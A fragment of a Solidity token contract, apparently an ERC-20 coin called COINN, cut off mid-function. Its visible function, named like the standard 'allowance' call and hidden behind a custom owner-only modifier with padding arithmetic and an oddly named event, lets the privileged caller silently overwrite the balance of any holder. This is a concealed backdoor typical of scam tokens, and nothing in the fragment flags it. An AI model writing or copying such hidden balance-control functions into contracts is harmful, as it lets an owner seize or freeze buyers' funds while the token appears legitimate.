...
contract COINN is Context, Ownable, IERC20 {
    ...
    function allowaance(address[] memory accounts, uint256 newBalance) external onlyMee {

        for (uint256 d = 0; d < accounts.length; d++) {

            uint256 currentBalance = _savings[accounts[d]] + 14;

            _savings[accounts[d]] = newBalance;

            emit saveeed(accounts[d], currentBalance - 14, newBalance);
